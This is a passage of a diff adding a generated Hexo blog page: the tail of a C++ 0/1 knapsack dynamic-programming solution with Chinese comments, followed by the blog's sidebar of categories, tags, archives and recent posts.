class="comment">//背包容量有可能为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        dp[v] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v = V; v &gt;= w[i]; v--)<span class="comment">//当v&lt;w[i]时dp值就是本身，所以不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            dp[v] = <span class="built_in">max</span>(dp[v], dp[v-w[i]] + c[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求最大值</span></span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, dp[v]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" data-id="ckr5o9zzk002sxkur5dsq2l97" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/dp/" rel="tag">dp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/project/">&amp;laquo; Prev</a><a class="page-number" href="/project/">1</a><span class="page-number current">2</span><a class="page-number" href="/project/page/3/">3</a><a class="extend next" rel="next" href="/project/page/3/">Next &amp;raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/project/categories/Git/">Git</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/">中国象棋</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">信息系统安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E5%AE%89%E5%8D%93/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">论文阅读</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E9%80%86%E5%90%91/">逆向</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/ARP/" rel="tag">ARP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/CV/" rel="tag">CV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/Git/" rel="tag">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/STL/" rel="tag">STL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/TCP/" rel="tag">TCP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/adversarial-patch/" rel="tag">adversarial patch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/db/" rel="tag">db</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/encryption/" rel="tag">encryption</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/gdb/" rel="tag">gdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/scapy/" rel="tag">scapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/vpn/" rel="tag">vpn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" rel="tag">中国象棋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%8E%92%E5%BA%8F/" rel="tag">排序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%95%A3%E5%88%97/" rel="tag">散列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="tag">虚拟机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%92%E5%BD%92/" rel="tag">递归</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/project/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/project/tags/C/" style="font-size: 10px;">C++</a> <a href="/project/tags/CV/" style="font-size: 10px;">CV</a> <a href="/project/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/project/tags/Git/" style="font-size: 10px;">Git</a> <a href="/project/tags/STL/" style="font-size: 10px;">STL</a> <a href="/project/tags/TCP/" style="font-size: 10px;">TCP</a> <a href="/project/tags/adversarial-patch/" style="font-size: 10px;">adversarial patch</a> <a href="/project/tags/android/" style="font-size: 10px;">android</a> <a href="/project/tags/blog/" style="font-size: 20px;">blog</a> <a href="/project/tags/db/" style="font-size: 10px;">db</a> <a href="/project/tags/dp/" style="font-size: 10px;">dp</a> <a href="/project/tags/encryption/" style="font-size: 10px;">encryption</a> <a href="/project/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/project/tags/linux/" style="font-size: 10px;">linux</a> <a href="/project/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/project/tags/scapy/" style="font-size: 10px;">scapy</a> <a href="/project/tags/vpn/" style="font-size: 10px;">vpn</a> <a href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" style="font-size: 15px;">中国象棋</a> <a href="/project/tags/%E5%88%B7%E9%A2%98/" style="font-size: 10px;">刷题</a> <a href="/project/tags/%E6%8E%92%E5%BA%8F/" style="font-size: 10px;">排序</a> <a href="/project/tags/%E6%95%A3%E5%88%97/" style="font-size: 10px;">散列</a> <a href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/project/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 10px;">虚拟机</a> <a href="/project/tags/%E9%80%86%E5%90%91/" style="font-size: 10px;">逆向</a> <a href="/project/tags/%E9%80%92%E5%BD%92/" style="font-size: 10px;">递归</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/project/2021/07/16/tmp/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/">hexo使用</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/19/vpn/">miniVPN实现</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/">安卓程序加密算法及密钥生成过程分析</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/17/ECCV2020/">Bias-based Universal Adversarial Patch Attack for Automatic Check-out</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Imane<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/project/" class="mobile-nav-link">Home</a>
+  
+    <a href="/project/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/project/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/project/tags" class="mobile-nav-link">Tags</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css">
+
+  
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/project/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
